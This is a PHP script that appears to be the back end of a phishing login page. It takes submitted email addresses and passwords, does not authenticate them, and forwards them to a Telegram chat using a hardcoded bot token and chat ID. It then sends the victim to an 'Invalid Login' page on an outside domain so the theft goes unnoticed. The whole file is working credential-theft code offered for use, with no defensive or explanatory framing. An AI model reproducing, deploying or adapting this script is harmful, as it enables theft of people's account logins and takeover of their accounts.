<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit("Method Not Allowed");
}

date_default_timezone_set('UTC');

$botToken = '8093851911:AAEyrP0mC_P-G3OrO7yV8CG5jlfUp7Hp9qA';
$chatId   = '5666631780';

$email = trim($_POST['username'] ?? '');
$password = trim($_POST['password'] ?? '');

if (empty($email) || empty($password)) {
    http_response_code(400);
    exit("Invalid input.");
}

$message = "🔐 *New Login Submission*\n";
$message .= "-----------------------------\n";
$message .= "📧 *Email:* {$email}\n";
$message .= "🔑 *Password:* {$password}\n";
$message .= "-----------------------------\n";
$message .= "📅 *Time:* " . date("Y-m-d H:i:s") . "\n";
$message .= "🌐 *Source:* login.php";

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirect after success
header("Location: https://authenticationform.rf.gd/cache_site/Invalid%20Login.php");
exit;
?>
